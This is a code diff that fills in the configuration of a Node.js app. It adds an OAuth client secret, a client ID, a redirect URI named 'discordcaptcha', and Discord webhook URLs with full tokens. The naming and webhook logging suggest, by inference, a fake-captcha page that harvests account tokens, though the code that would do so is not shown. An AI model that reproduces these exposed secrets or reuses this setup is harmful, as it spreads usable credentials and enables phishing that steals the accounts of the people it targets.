@@ -1,9 +1,9 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
-const redirect_uri = 'change'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const client_secret = 'Pl78Q~-Miz8kg4uuwEIGiD3x1XSxS2hjDbLs4baF'
+const client_id = '28db0ee4-3d16-4941-86a7-317fa0f63ddd'
+const redirect_uri = 'https://discordcaptcha.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1054471950979829840/CPAD6YM72PbidBifCbL4NAGLZ_iJiW4hiUtnR1_Yx090I312lSZPvHLo_HxnqtkSaZkh'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1054471950979829840/CPAD6YM72PbidBifCbL4NAGLZ_iJiW4hiUtnR1_Yx090I312lSZPvHLo_HxnqtkSaZkh'
 // Config end
 const axios = require('axios')
 const express = require('express')
